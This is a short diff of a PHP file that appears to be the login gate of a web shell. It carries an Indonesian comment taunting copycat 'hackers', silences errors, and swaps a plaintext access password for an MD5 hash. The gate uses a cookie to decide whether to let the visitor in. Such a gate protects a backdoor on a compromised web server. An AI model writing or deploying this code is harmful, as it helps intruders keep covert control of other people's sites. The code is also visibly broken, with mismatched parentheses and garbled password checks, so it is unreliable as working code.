@@ -1,7 +1,7 @@
 <?php
 # merename nama dan mereupload konten tidak akan membuatmu menjadi hekers sejati 
 error_reporting(0);
-$password='guaganteng';//passwordmu
+$password='bb54b0634091149d6720b6dd160f069f';//passwordmu
 $xyn='psatir';
 if(isset($_POST['pass'])) {if(md5($_POST['pass']==$password) {setcookie($xyn, md5($_POST['pass'], time()+3600);} let_him_in();}
 if(!empty($password) && !isset($_COOKIE[$xyn]) or ($_COOKIE[$xyn]!=$password)) {initiate(); die();}
